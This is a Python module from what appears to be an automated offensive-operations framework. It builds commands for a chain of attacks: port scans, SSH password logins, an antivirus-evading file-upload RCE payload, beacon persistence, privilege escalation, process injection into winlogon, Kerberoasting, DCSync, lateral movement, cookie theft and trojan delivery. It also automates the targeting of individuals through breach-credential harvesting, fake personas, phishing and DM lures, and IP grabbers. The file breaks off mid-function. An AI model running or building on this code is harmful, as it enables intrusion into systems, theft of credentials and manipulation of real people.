"""
kit.py — built-in capability library.

Every adapter here is the ONLY place that knows how a tool's command
line is built. Interpreters live in perception.py and are shared.
"""

from __future__ import annotations

import os
import re
from typing import Any, Dict, List, Optional

from phantom.automation.belief import WorldModel, Finding
from phantom.automation.guidance.commands import Capability, InputSlot
from phantom.automation.perception import (
    parse_nmap_ports,
    parse_nmap_os,
    parse_http_banner,
    detect_cms,
    parse_smb_shares,
    parse_redis_info,
    parse_ssh_banner,
)


def _has_service(kind_service: str, port: str):
    def _requires_service(wm: WorldModel) -> bool:
        return wm.has(kind_service, port) if port else bool(wm.find("service"))
    return _requires_service


def _has_service_kind(kind_service: str, service_name: str):
    """True when a service finding exists for ``service_name`` on ANY port
    (SSH on 22, 2222, 22222 ...). Port-exact preconditions silently skip
    non-standard management ports that labs and hardened hosts hide behind."""
    def _requires_service(wm: WorldModel) -> bool:
        for finding in wm.find(kind_service):
            value = finding.value if isinstance(finding.value, dict) else {}
            if str(value.get("service", "")).lower() == service_name:
                return True
        return False
    return _requires_service


_WEB_PORTS = {80, 443, 8080, 8081, 8443, 8000, 8888, 3000, 5000, 9090}


def _has_web_service():
    """True when the scan found a web-capable service: an http/ssl service
    label on ANY port, or a service on a well-known web port."""
    def _requires_web(wm: WorldModel) -> bool:
        for finding in wm.find("service"):
            value = finding.value if isinstance(finding.value, dict) else {}
            service = str(value.get("service", "")).lower()
            try:
                port = int(value.get("port", 0))
            except (TypeError, ValueError):
                port = 0
            if service in ("http", "https", "ssl", "http-alt", "www"):
                return True
            if service.startswith("http") or "web" in service:
                return True
            if port in _WEB_PORTS:
                return True
        return False
    return _requires_web


def _has_creds():
    def _requires_creds(wm: WorldModel) -> bool:
        return bool(wm.find("creds", valid=True))
    return _requires_creds


def _has_beacon():
    def _requires_beacon(wm: WorldModel) -> bool:
        return bool(wm.find("beacon"))
    return _requires_beacon


def _has_env_container():
    """True when the environment probe flagged a container/cloud/VM box
    (the vantage from which metadata harvesting is meaningful)."""
    def _requires_env(wm: WorldModel) -> bool:
        for f in wm.find("environment"):
            v = f.value if isinstance(f.value, dict) else {}
            kinds = v.get("kinds") or []
            labels = [str(k.get("kind", "")) for k in kinds] if kinds else []
            if any(x in labels for x in ("container", "kubernetes", "cloud")):
                return True
        return True  # metadata harvest is safe to try on any beacon box
    return _requires_env


def _has_cloud_creds():
    """True when cloud identity material (AWS/GCP/Azure) was captured."""
    def _requires_cloud(wm: WorldModel) -> bool:
        if wm.find("cloud_creds"):
            return True
        for f in wm.find("creds"):
            v = f.value if isinstance(f.value, dict) else {}
            if str(v.get("service", "")) in ("aws", "gcp", "azure", "cloud"):
                return True
        return False
    return _requires_cloud


def _has_system_privilege():
    def _requires_system_privilege(wm: WorldModel) -> bool:
        return bool(wm.find("system_privilege"))
    return _requires_system_privilege


def _has_ad_domain():
    def _requires_ad_domain(wm: WorldModel) -> bool:
        return bool(wm.find("ad_domain"))
    return _requires_ad_domain


def _has_ad_service():
    """An Active Directory surface is reachable: the scan saw LDAP/Kerberos
    ports (88/389/636/3268/3269), a service name hinting ldap/kerberos/
    domain, or the domain is already known. This is what lets the AD chain
    (ad_enum → kerberoast/as_rep → hash_crack) run DIRECTLY from the
    operator — no beacon foothold required."""
    _AD_PORTS = {"88", "389", "636", "3268", "3269"}

    def _requires_ad_service(wm: WorldModel) -> bool:
        if wm.has_any("ad_domain"):
            return True
        # a beacon on a domain-joined box can enumerate AD from inside even
        # when the operator's scan did not see the LDAP/Kerberos ports
        if wm.has_any("beacon"):
            return True
        for f in wm.find("service"):
            v = f.value if isinstance(f.value, dict) else {}
            port = str(v.get("port", ""))
            svc = str(v.get("service", "")).lower()
            if port in _AD_PORTS:
                return True
            if any(k in svc for k in ("ldap", "kerberos", "kpasswd", "domain")):
                return True
        return False
    return _requires_ad_service


def _has_ad_hash():
    def _requires_ad_hash(wm: WorldModel) -> bool:
        return any(f.value.get("hash") for f in wm.find("ad_creds"))
    return _requires_ad_hash


def _has_ip():
    def _requires_ip(wm: WorldModel) -> bool:
        return bool(wm.target)
    return _requires_ip


def _has_target_type(*types):
    """Precondition: the engagement target is one of the given types."""
    def _requires_type(wm: WorldModel) -> bool:
        return wm.target_type in types
    return _requires_type


def _has_finding(kind: str):
    def _requires_finding(wm: WorldModel) -> bool:
        return bool(wm.find(kind))
    return _requires_finding


def _has_sent_lure():
    """A lure was delivered: a phish (email/SMS) OR a DM. Both converge on
    the same grabber, so poll/harvest accept either channel."""
    def _requires_lure(wm: WorldModel) -> bool:
        return bool(wm.find("phish") or wm.find("dm_sent"))
    return _requires_lure


def _not_profile_known():
    """No social profile was mapped yet. Keeps the single-shot grabber poll
    for plain email/SMS phish flows, while profile-based flows (Instagram
    handle known, DM path) go through harvest_campaign — the campaign poll
    that also catches opens/credentials and powers the cadence wait."""
    def _requires_no_profile(wm: WorldModel) -> bool:
        return not bool(wm.find("profile"))
    return _requires_no_profile


def _harvest_flow():
    """The campaign-harvest wait (chunked sleep + cadence) is the poll of
    choice for SOCIAL flows — a known profile / DM path, or handle/phone
    targets (username/phone). Plain email-only targets without a profile
    keep the quick single-shot grabber poll instead."""
    def _requires_social(wm: WorldModel) -> bool:
        if wm.find("profile"):
            return True
        return getattr(wm, "target_type", "") in ("username", "phone")
    return _requires_social


def _private_profile(wm: WorldModel) -> bool:
    """True when profile_recon proved the target account is private."""
    for f in wm.find("profile") or []:
        if f.value.get("private"):
            return True
    return False


def _dm_ready():
    """DM delivery gate: on a private account the follow must be accepted
    first (the target accepted our follow request); public accounts are
    DM-able as soon as an identity exists."""
    def _requires_dm_ready(wm: WorldModel) -> bool:
        if not wm.find("identity"):
            return False
        if _private_profile(wm):
            return bool(wm.find("follow_accepted"))
        return True
    return _requires_dm_ready


def _not_private_profile():
    """Email lures are gated OFF for private accounts: the natural path for
    a private profile is follow -> wait -> DM (never an unsolicited email
    that the account state makes implausible)."""
    def _requires_public(wm: WorldModel) -> bool:
        return not _private_profile(wm)
    return _requires_public


def _has_network_host():
    """Precondition: a real machine to aim network tooling at.

    Network targets (ip/domain/url) qualify as-is; identity targets
    (email/username/phone) qualify only once OSINT + phish produced a
    victim_ip. This is the convergence gate of the identity chain: the
    network kill chain cannot start before the identity target became a
    reachable host.
    """
    def _requires_network_host(wm: WorldModel) -> bool:
        if wm.target_type in ("ip", "domain", "url"):
            return True
        return bool(wm.find("victim_ip"))
    return _requires_network_host


def _effective_target(wm: WorldModel) -> str:
    """The machine to aim network tooling at.

    For identity targets (username/email/phone) the harvested victim IP
    becomes the real machine target; for network targets it is the target
    itself. This is how the identity chain converges on beacon injection.
    """
    ips = wm.find("victim_ip")
    if ips:
        return str(ips[0].value.get("ip", wm.target))
    return wm.target


def _beacon_payload(wm: WorldModel) -> str:
    """The exact beacon command that established the current session."""
    b = wm.find("beacon")
    if not b:
        raise ValueError("no beacon session established")
    return b[0].value.get("payload", "true")


def _target_os(wm: WorldModel) -> str:
    """The target OS name: confirmed `os` finding first (its value carries
    `name` from nmap -O), then the reasoning engine's `os_inferred`.
    Returns "" when neither exists so callers can fall back safely."""
    for kind in ("os", "os_inferred"):
        os_f = wm.find(kind)
        if not os_f:
            continue
        value = os_f[0].value if isinstance(os_f[0].value, dict) else {}
        name = value.get("os") or value.get("name") or ""
        if name:
            return str(name)
    return ""


def _ad_domain(wm: WorldModel) -> str:
    f = wm.find("ad_domain")
    return str(f[0].value.get("domain", "")) if f else ""


def _ad_dc(wm: WorldModel) -> str:
    """The domain controller to aim AD attacks at: the DC resolved by
    ad_enum, falling back to the compromised target host when unresolved."""
    f = wm.find("ad_domain")
    if f and isinstance(f[0].value, dict):
        dc = f[0].value.get("dc_host", "")
        if dc:
            return str(dc)
    return wm.target


def _mk_slot(name: str, typ: str, required: bool = True, desc: str = "") -> InputSlot:
    return InputSlot(name=name, type=typ, required=required, description=desc)


def _mk(cap_id: str, category: str, desc: str, inputs: List[InputSlot],
        effects: List[str], adapter, interpreter=None, opsec_cost: float = 1.0,
        detection_risk: float = 0.1, stealth_level: str = "passive",
        forceful: bool = False, timeout: int = 30, preconditions: List = None,
        banner: str = "", tools: List[str] = None) -> Capability:
    return Capability(
        id=cap_id, category=category, description=desc, inputs=inputs,
        effects=effects, adapter=adapter, interpreter=interpreter,
        opsec_cost=opsec_cost, detection_risk=detection_risk,
        stealth_level=stealth_level, forceful=forceful, timeout=timeout,
        preconditions=preconditions or [], banner=banner or desc,
        tools=tools or [])


def _interp_nmap_ports(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
    return [Finding(**f, target=wm.target) for f in parse_nmap_ports(output)]


def _interp_nmap_os(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
    return [Finding(**f, target=wm.target) for f in parse_nmap_os(output)]


def _interp_http(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
    findings = [Finding(**f, target=wm.target) for f in parse_http_banner(output)]
    cms = detect_cms(output)
    if cms:
        findings.append(Finding(**cms, target=wm.target))
    return findings


def _interp_smb(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
    return [Finding(**f, target=wm.target) for f in parse_smb_shares(output)]


def _interp_redis(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
    return [Finding(**f, target=wm.target) for f in parse_redis_info(output)]


def _interp_ssh_banner(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
    f = parse_ssh_banner(output)
    return [Finding(**f, target=wm.target)] if f else []


def _interp_from(func_name: str):
    """Lazy interpreter binding for post-exploitation modules.

    Imported at interpretation time so the post package stays optional
    until a beacon session actually exists.
    """
    _MODULES = {
        "persistence_interpreter": "phantom.automation.post.persistence",
        "privesc_interpreter": "phantom.automation.post.privesc",
        "inject_interpreter": "phantom.automation.post.inject",
        "ad_enum_interpreter": "phantom.automation.post.ad",
        "kerberoast_interpreter": "phantom.automation.post.ad",
        "as_rep_interpreter": "phantom.automation.post.ad",
        "dc_sync_interpreter": "phantom.automation.post.ad",
        "hash_crack_interpreter": "phantom.automation.post.ad",
        "lateral_interpreter": "phantom.automation.post.lateral",
        "smb_pivot_interpreter": "phantom.automation.post.lateral",
        "winrm_pivot_interpreter": "phantom.automation.post.lateral",
        "cleanup_interpreter": "phantom.automation.post.cleanup",
        "cookies_interpreter": "phantom.automation.post.harvest",
        "bt_scan_interpreter": "phantom.automation.post.harvest",
        "cdp_cookies_interpreter": "phantom.automation.post.harvest",
        "socks_interpreter": "phantom.automation.post.harvest",
        "ransom_sim_interpreter": "phantom.automation.post.ransom_sim",
        "trojan_deliver_interpreter": "phantom.automation.post.trojan",
    }

    def _interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
        import importlib
        module = importlib.import_module(_MODULES[func_name])
        return getattr(module, func_name)(output, wm, slots)

    return _interp


# ---------------------------------------------------------------------------
# social / identity capability builders
# ---------------------------------------------------------------------------

_SOCIAL_MARKERS = {
    "identity": "IDENTITY:",
    "breach": "BREACH:",
    "breach_exposure": "BREACH_EXPOSURE:",
    "persona": "PERSONA:",
    "persona_profile": "PERSONA_PROFILE:",
    "dossier": "DOSSIER:",
    "dossier_recommend": "DOSSIER_RECOMMEND:",
    "profile": "PROFILE:",
    "account_link": "ACCOUNT_LINK:",
    "phish": "PHISH_SENT:",
    "campaign": "CAMPAIGN:",
    "open": "OPEN:",
    "creds": "CREDS:",
    "victim_ip": "VICTIM_IP:",
    "dm": "DM_SENT:",
    "follow_sent": "FOLLOW_SENT:",
    "follow_accepted": "FOLLOW_ACCEPTED:",
}


def _parse_marker_line(line: str, marker: str) -> Dict[str, Any]:
    if not line.startswith(marker):
        return {}
    kv = {}
    for chunk in line[len(marker):].split():
        if "=" in chunk:
            k, v = chunk.split("=", 1)
            kv[k.strip()] = v.strip()
    return kv


def _social_interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
    """Shared interpreter for social capabilities: parses the stable
    markers produced by the SocialEngine into typed findings."""
    findings: List[Finding] = []
    for line in (output or "").splitlines():
        kv = _parse_marker_line(line, _SOCIAL_MARKERS["identity"])
        if kv.get("username") or kv.get("email") or kv.get("phone"):
            findings.append(Finding(
                kind="identity",
                key=f"identity:{kv.get('username', kv.get('email', kv.get('phone')))}",
                value={"username": kv.get("username", ""),
                       "email": kv.get("email", ""),
                       "phone": kv.get("phone", ""),
                       "carrier": kv.get("carrier", ""),
                       "region": kv.get("region", ""),
                       "platform": kv.get("platform", ""),
                       "url": kv.get("url", "")},
                confidence=0.7, source="osint", target=wm.target))
        kv = _parse_marker_line(line, _SOCIAL_MARKERS["breach_exposure"])
        if kv.get("email") and kv.get("breach"):
            findings.append(Finding(
                kind="breach_exposure", key=f"breach:{kv['breach']}",
                value={"email": kv.get("email"),
                       "breach": kv.get("breach"),
                       "date": kv.get("date", "")},
                confidence=0.6, source="breach_check", target=wm.target))
        kv = _parse_marker_line(line, _SOCIAL_MARKERS["breach"])
        if kv.get("email") and kv.get("password"):
            findings.append(Finding(
                kind="creds", key=f"breach:{kv['email']}",
                value={"username": kv.get("email"),
                       "password": kv.get("password"),
                       "valid": False, "service": "leak",
                       "source": kv.get("source", "breach")},
                confidence=0.6, source="breach_check", target=wm.target))
        kv = _parse_marker_line(line, _SOCIAL_MARKERS["persona"])
        if kv.get("email"):
            findings.append(Finding(
                kind="identity", key=f"persona:{kv['email']}",
                value={"email": kv.get("email"), "mailbox": kv.get("mailbox", ""),
                       "role": "persona"},
                confidence=0.9, source="persona_create", target=wm.target))
        kv = _parse_marker_line(line, _SOCIAL_MARKERS["persona_profile"])
        if kv.get("name"):
            findings.append(Finding(
                kind="persona_profile", key=f"persona_profile:{kv['name']}",
                value={"name": kv.get("name"), "age": kv.get("age", ""),
                       "job": kv.get("job", ""), "location": kv.get("location", ""),
                       "avatar": kv.get("avatar", "")},
                confidence=0.85, source="persona_create", target=wm.target))
        kv = _parse_marker_line(line, _SOCIAL_MARKERS["dossier_recommend"])
        if kv.get("pretext"):
            findings.append(Finding(
                kind="dossier", key="dossier:recommend",
                value={"pretext": kv.get("pretext"),
                       "score": kv.get("score", "")},
                confidence=0.8, source="dossier", target=wm.target))
        kv = _parse_marker_line(line, _SOCIAL_MARKERS["profile"])
        if kv.get("username") and kv.get("platform"):
            findings.append(Finding(
                kind="profile", key=f"profile:{kv['username']}",
                value={"username": kv.get("username"),
                       "platform": kv.get("platform"),
                       "private": kv.get("private", "0") == "1",
                       "bio": kv.get("bio", ""), "link": kv.get("link", "")},
                confidence=0.75, source="profile_recon", target=wm.target))
        kv = _parse_marker_line(line, _SOCIAL_MARKERS["account_link"])
        if kv.get("handle") and kv.get("url"):
            findings.append(Finding(
                kind="account_link", key=f"account_link:{kv['handle']}:{kv.get('platform', kv.get('source', ''))}",
                value={"handle": kv.get("handle"),
                       "platform": kv.get("platform", kv.get("source", "")),
                       "url": kv.get("url")},
                confidence=0.7, source="profile_recon", target=wm.target))
        kv = _parse_marker_line(line, _SOCIAL_MARKERS["phish"])
        if kv.get("to") and kv.get("link"):
            findings.append(Finding(
                kind="phish", key=f"phish:{kv['to']}",
                value={"to": kv.get("to"), "channel": kv.get("channel", "email"),
                       "link": kv.get("link")},
                confidence=0.9, source="phish", target=wm.target))
        kv = _parse_marker_line(line, _SOCIAL_MARKERS["victim_ip"])
        if kv.get("ip"):
            findings.append(Finding(
                kind="victim_ip", key=kv["ip"],
                value={"ip": kv["ip"], "user_agent": kv.get("ua", ""),
                       "time": kv.get("when", "")},
                confidence=0.9, source="grabber", target=wm.target))
        kv = _parse_marker_line(line, _SOCIAL_MARKERS["campaign"])
        if kv.get("id") and kv.get("to"):
            findings.append(Finding(
                kind="campaign", key=f"campaign:{kv['id']}:{kv['to']}",
                value={"id": kv.get("id"), "pretext": kv.get("pretext", ""),
                       "to": kv.get("to"), "status": kv.get("status", "sent"),
                       "link": kv.get("link", "")},
                confidence=0.9, source="phish", target=wm.target))
        kv = _parse_marker_line(line, _SOCIAL_MARKERS["open"])
        if kv.get("to") and kv.get("ip"):
            findings.append(Finding(
                kind="phish_open", key=f"open:{kv['to']}:{kv['ip']}",
                value={"to": kv.get("to"), "ip": kv.get("ip")},
                confidence=0.7, source="grabber", target=wm.target))
        kv = _parse_marker_line(line, _SOCIAL_MARKERS["creds"])
        if kv.get("password"):
            # harvested credentials are a REAL foothold: verified against a
            # live service by the planner before use, but they are the
            # strongest credential signal the social chain can produce
            findings.append(Finding(
                kind="creds", key=f"phish:{kv.get('username') or kv.get('email')}",
                value={"username": kv.get("username") or kv.get("email"),
                       "password": kv.get("password"),
                       "otp": kv.get("otp", ""),
                       "valid": False, "service": "harvest",
                       "source": "phish_harvest"},
                confidence=0.8, source="phish_harvest", target=wm.target))
        kv = _parse_marker_line(line, _SOCIAL_MARKERS["dm"])
        if kv.get("to"):
            # a delivered DM with a tracking link is a phish on another
            # channel: same downstream value (click -> victim_ip)
            findings.append(Finding(
                kind="dm_sent", key=f"dm:{kv['to']}",
                value={"to": kv.get("to"), "platform": kv.get("platform", ""),
                       "link": kv.get("link", ""),
                       "delivered": kv.get("delivered", "0") == "1"},
                confidence=0.8 if kv.get("delivered") == "1" else 0.3,
                source="dm_launch", target=wm.target))
        kv = _parse_marker_line(line, _SOCIAL_MARKERS["follow_sent"])
        if kv.get("handle"):
            findings.append(Finding(
                kind="follow_sent", key=f"follow:{kv['handle']}",
                value={"handle": kv.get("handle"),
                       "platform": kv.get("platform", ""),
                       "delivered": kv.get("delivered", "0") == "1",
                       "note": kv.get("note", "")},
                confidence=0.7, source="dm_follow", target=wm.target))
        kv = _parse_marker_line(line, _SOCIAL_MARKERS["follow_accepted"])
        if kv.get("handle"):
            findings.append(Finding(
                kind="follow_accepted", key=f"follow:{kv['handle']}",
                value={"handle": kv.get("handle"),
                       "platform": kv.get("platform", "")},
                confidence=0.9, source="wait_follow", target=wm.target))
    return findings


def _osint_identity_adapter(wm, slots):
    return f"social-osint {wm.target}"


def _breach_check_adapter(wm, slots):
    return f"social-breach {wm.target}"


def _persona_create_adapter(wm, slots):
    return "social-persona"


def _persona_profile_adapter(wm, slots):
    return "social-persona-profile"


def _dossier_adapter(wm, slots):
    return "social-dossier"


def _profile_recon_adapter(wm, slots):
    platform = slots.get("platform", "")
    if platform:
        return f"social-profile-recon {wm.target} {platform}"
    return f"social-profile-recon {wm.target}"


def _phish_adapter(wm, slots):
    return f"social-phish {wm.target}"


def _poll_hits_adapter(wm, slots):
    return "social-poll"


def _campaign_adapter(wm, slots):
    return f"social-campaign {wm.target}"


def _harvest_adapter(wm, slots):
    return "social-harvest"


def _dm_adapter(wm, slots):
    return "social-dm"


# ---------------------------------------------------------------------------
# capability builders
# ---------------------------------------------------------------------------

def _port_scan_adapter(wm, slots):
    ports = slots.get("port")
    if ports:
        return f"nmap -Pn -sT -p {ports} {_effective_target(wm)}"
    return f"nmap -Pn -sT {_scan_port_spec(wm)} {_effective_target(wm)}"


def _known_open_ports(wm) -> list:
    """Ports already seen as open services in the WorldModel (deduped,
    numeric-sorted). The port scan records WHICH ports are open; the
    version detection only re-probes those — re-scanning everything
    burned 4 minutes per wave and always timed out on full sweeps."""
    out: set = set()
    for f in wm.find("service"):
        v = f.value if isinstance(f.value, dict) else {}
        try:
            out.add(int(str(v.get("port", "")).split("/")[0]))
        except (TypeError, ValueError):
            continue
    return sorted(out)


def _scan_port_spec(wm) -> str:
    """Port coverage per run profile (stamped on the WorldModel by the
    agent from the CLI flags):
      default    -> full 1-65535 sweep
      --stealth  -> full sweep, slow -T2 timing (quiet)
      --speed    -> top-100 fast (--min-rate 3000)
      --aggressive-> top-100 fastest (--min-rate 5000)
    -sV is always on: plain scans label non-standard ports with wrong
    table guesses (2222 -> "EtherNetIP-1"), which breaks every service
    precondition downstream (ssh_login needs service == "ssh").
    An explicit port slot always wins (deep-scan escalation, targeted
    version detection).
    """
    style = getattr(wm, "scan_style", "full")
    if style == "top_loud":
        return "--top-ports 100 --min-rate 5000"
    if style == "top_fast":
        return "--top-ports 100 --min-rate 3000"
    if style == "full_stealth":
        return "-p 1-65535 -T2"
    return "-p 1-65535 --min-rate 1000"


def _service_port(wm, service: str, default: int = 22) -> int:
    """The port the scanner actually discovered for a service (SSH on
    2222, tomcat on 8081 ...); falls back to the well-known port."""
    for finding in wm.find("service"):
        value = finding.value if isinstance(finding.value, dict) else {}
        if str(value.get("service", "")).lower() == service:
            try:
                return int(value.get("port"))
            except (TypeError, ValueError):
                pass
    return default


def _version_adapter(wm, slots):
    port = slots.get("port")
    if port:
        return f"nmap -Pn -sT -sV -p {port} {_effective_target(wm)}"
    known = _known_open_ports(wm)
    if known:
        # only the ports the scan actually found open: fast and precise,
        # never a second full-range sweep (the old default re-scanned
        # 1-65535 with -sV and timed out every time)
        spec = ",".join(str(p) for p in known)
        return f"nmap -Pn -sT -sV -p {spec} {_effective_target(wm)}"
    return f"nmap -Pn -sT -sV --top-ports 100 {_effective_target(wm)}"


def _os_adapter(wm, slots):
    return f"nmap -Pn -O {_effective_target(wm)}"


def _http_probe_adapter(wm, slots):
    url = slots.get("url", f"http://{_effective_target(wm)}")
    return f"curl -s -I -m 15 {url}"


def _http_get_adapter(wm, slots):
    url = slots.get("url", f"http://{_effective_target(wm)}")
    return f"curl -s -m 15 {url}"


def _smb_enum_adapter(wm, slots):
    host = slots.get("host", _effective_target(wm))
    return f"smbmap -H {host}"


def _redis_info_adapter(wm, slots):
    return f"redis-cli -h {_effective_target(wm)} -p {slots.get('port', '6379')} info"


def _ssh_banner_adapter(wm, slots):
    return f"nc -w 5 {_effective_target(wm)} {slots.get('port', '22')}"


def _ssh_login_adapter(wm, slots):
    user, pw = slots["username"], slots["password"]
    port = _service_port(wm, "ssh")
    return (f"sshpass -p {pw} ssh -p {port} -o StrictHostKeyChecking=no "
            f"-o ConnectTimeout=10 {user}@{_effective_target(wm)} 'id'")


def _web_creds_adapter(wm, slots):
    """Adapter: run the deterministic web→credentials engine on all web
    services; returns WEBCREDS: marker lines the interpreter parses."""
    from phantom.automation.exploit.webcreds import run_web_creds_dump
    host = _effective_target(wm)
    creds = run_web_creds_dump(wm, host)
    if not creds:
        return "# web credential extraction found no credentials"
    return "\n".join(c.marker() for c in creds)


def _web_creds_interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
    """Interpreter: parse WEBCREDS: markers into validated creds findings."""
    findings = []
    for line in output.split("\n"):
        line = line.strip()
        if not line.startswith("WEBCREDS:"):
            continue
        parts = line.split(":")
        if len(parts) < 5:
            continue
        user, pw, port, method = parts[1], parts[2], parts[3], parts[4]
        confidence = 0.7
        try:
            confidence = float(parts[5]) if len(parts) > 5 else 0.7
        except ValueError:
            pass
        findings.append(Finding(
            kind="creds", key=f"web:{user}",
            value={"username": user, "password": pw, "service": "",
                   "valid": True, "method": f"web_{method}",
                   "port": port},
            confidence=min(confidence, 0.9), source="web_creds",
            target=wm.target))
    return findings


def _beacon_adapter(wm, slots):
    return slots["command"]


def _persist_adapter(wm, slots):
    from phantom.automation.post.persistence import (
        windows_persist_command, linux_persist_command)
    os_name = slots.get("os") or _target_os(wm)
    payload = slots.get("payload") or _beacon_payload(wm)
    method = slots.get("method") or (
        "runkey" if "windows" in os_name.lower() else "cron")
    if "windows" in os_name.lower():
        return windows_persist_command(method, payload)
    return linux_persist_command(method, payload)


def _privesc_adapter(wm, slots):
    from phantom.automation.post.privesc import system_escalation_command
    os_name = slots.get("os") or _target_os(wm)
    payload = slots.get("payload") or _beacon_payload(wm)
    return system_escalation_command(os_name, payload)


def _inject_adapter(wm, slots):
    from phantom.automation.post.inject import inject_beacon_command
    os_name = slots.get("os") or _target_os(wm)
    payload = slots.get("payload") or _beacon_payload(wm)
    proc = slots.get("target_process", "winlogon")
    return inject_beacon_command(os_name, payload, target_process=proc)


def _web_service_target(wm):
    """(host, port) of the REAL web app to attack.

    Prefers ports with a web-app fingerprint (http_probe), then any web
    port EXCLUDING the operator's own C2 listener port (the C2 listener
    binds a web-ish port and the scan sees it as a service — attacking it
    would upload to our own listener, not the target's app). Defaults 80.
    """
    host = _effective_target(wm)
    app_ports = {str(v.get("port", "")) for f in wm.find("web_app")
                 if isinstance(f.value, dict)
                 for v in [f.value]}
    c2_port = None
    try:
        from phantom.utils.network import get_c2_endpoint
        c2_port = str(get_c2_endpoint()[1])
    except Exception:
        pass
    web_ports = {str(p) for p in _WEB_PORTS}
    for f in wm.find("service"):
        v = f.value if isinstance(f.value, dict) else {}
        if str(v.get("port", "")) in app_ports:
            return host, str(v.get("port"))
    for f in wm.find("service"):
        v = f.value if isinstance(f.value, dict) else {}
        p = str(v.get("port", ""))
        if p in web_ports and p != c2_port:
            return host, p
    return host, "80"


def _web_rce_adapter(wm, slots):
    """Arbitrary-file-upload -> RCE probe on a discovered web app.

    POSTs a tiny python script that prints a unique marker; if the app
    executes uploaded .py files (real report-generator RCE), the response
    contains the marker and we own the box without any credentials.
    The probe itself is one bounded request — non-destructive, no exploit
    side effects.
    """
    import random
    import tempfile
    target, port = _web_service_target(wm)
    marker = f"PHANTOM_RCE_{random.randint(100000, 999999)}"
    payload = ("import os\n"
               f"print('{marker}:'+str(os.getuid()))\n")
    # write the payload to a NON-.py temp file (av anti-exec heuristics on
    # %TEMP% python files) and force the .py name on the wire with
    # ;filename= so the target's upload handler still executes it
    with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as tf:
        tf.write(payload)
        tmp = tf.name
    scheme = "https" if port in ("443", "8443") else "http"
    return (f"curl -s -m 8 -F 'file=@{tmp};filename=probe.py' "
            f"{scheme}://{target}:{port}/upload | grep -o '{marker}:[0-9]*'")


def _web_rce_interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
    """Interpreter: a PHANTOM_RCE_<n>:<uid> marker proves code execution on
    the box -> rce_foothold finding (usable by beacon_via_rce)."""
    import re
    findings = []
    m = re.search(r"(PHANTOM_RCE_\d+):(\d+)", output)
    if m:
        findings.append(Finding(
            kind="rce_foothold", key="web_upload",
            value={"vector": "arbitrary-file-upload", "uid": m.group(2)},
            confidence=0.9, source="web_rce",
            evidence=output.strip()[:200]))
    return findings


def _ad_enum_adapter(wm, slots):
    from phantom.automation.post.ad import ad_enum_command
    domain = slots.get("domain") or _ad_domain(wm)
    return ad_enum_command(domain, wm.target)


def _kerberoast_adapter(wm, slots):
    from phantom.automation.post.ad import kerberoast_command
    domain = slots.get("domain") or _ad_domain(wm)
    user, pw = slots.get("username", ""), slots.get("password", "")
    if not (domain and user and pw):
        raise ValueError("kerberoast requires a domain and valid credentials")
    return kerberoast_command(domain, user, pw, _ad_dc(wm))


def _lateral_adapter(wm, slots):
    from phantom.automation.post.lateral import lateral_pivot_command
    host = slots.get("host", "")
    if not host:
        raise ValueError("lateral pivot requires a peer host")
    user, pw = slots.get("username", ""), slots.get("password", "")
    payload = slots.get("payload") or _beacon_payload(wm)
    return lateral_pivot_command(host, user, pw, payload)


def _smb_adapter(wm, slots):
    from phantom.automation.post.lateral import smb_pivot_command
    host = slots.get("host", "")
    if not host:
        raise ValueError("smb pivot requires a peer host")
    user, pw = slots.get("username", ""), slots.get("password", "")
    payload = slots.get("payload") or _beacon_payload(wm)
    return smb_pivot_command(host, user, pw, payload, domain=_ad_domain(wm))


def _winrm_adapter(wm, slots):
    from phantom.automation.post.lateral import winrm_pivot_command
    host = slots.get("host", "")
    if not host:
        raise ValueError("winrm pivot requires a peer host")
    user, pw = slots.get("username", ""), slots.get("password", "")
    payload = slots.get("payload") or _beacon_payload(wm)
    return winrm_pivot_command(host, user, pw, payload, domain=_ad_domain(wm))


def _as_rep_adapter(wm, slots):
    from phantom.automation.post.ad import as_rep_roast_command
    domain = slots.get("domain") or _ad_domain(wm)
    user, pw = slots.get("username", ""), slots.get("password", "")
    if not (domain and user and pw):
        raise ValueError("as_rep_roast requires a domain and valid credentials")
    return as_rep_roast_command(domain, user, pw, _ad_dc(wm))


def _dc_sync_adapter(wm, slots):
    from phantom.automation.post.ad import dc_sync_command
    domain = slots.get("domain") or _ad_domain(wm)
    user, pw = slots.get("username", ""), slots.get("password", "")
    if not (domain and user and pw):
        raise ValueError("dc_sync requires a domain and valid credentials")
    return dc_sync_command(domain, user, pw, _ad_dc(wm))


def _hash_crack_adapter(wm, slots):
    from phantom.automation.post.ad import hash_crack_command
    hash_val = slots.get("hash", "")
    if not hash_val:
        for f in wm.find("ad_creds"):
            if f.value.get("hash"):
                hash_val = str(f.value["hash"])
                break
    if not hash_val:
        raise ValueError("hash_crack requires a captured AD hash (kerberoast / as_rep / dc_sync)")
    return hash_crack_command(hash_val)


def _cleanup_adapter(wm, slots):
    from phantom.automation.post.cleanup import cleanup_command
    os_name = slots.get("os") or _target_os(wm)
    payload = slots.get("payload") or _beacon_payload(wm)
    return cleanup_command(os_name, payload)


def _cookies_adapter(wm, slots):
    from phantom.automation.post.harvest import cookies_command
    return cookies_command()


def _bt_scan_adapter(wm, slots):
    from phantom.automation.post.harvest import bt_scan_command
    return bt_scan_command()


def _cdp_cookies_adapter(wm, slots):
    from phantom.automation.post.harvest import cdp_cookies_command
    return cdp_cookies_command(port=int(slots.get("port") or 9222))


def _socks_adapter(wm, slots):
    from phantom.automation.post.harvest import socks_command
    return socks_command(port=int(slots.get("port") or 1080))


def _ransom_sim_adapter(wm, slots):
    from phantom.automation.post.ransom_sim import ransom_sim_command
    return ransom_sim_command(slots.get("dir") or ".")


def _trojan_deliver_adapter(wm, slots):
    """Supply-chain delivery: stage the bundle on the operator host (real
    carrier + staged beacon payload) and drop it on the target.

    When the agent carries trojan assets (carrier/payload), the overlay
    bundle is built HERE — this is the consumer of trojan_bundle.py. Without
    assets the command is the plain beacon-side drop.
    """
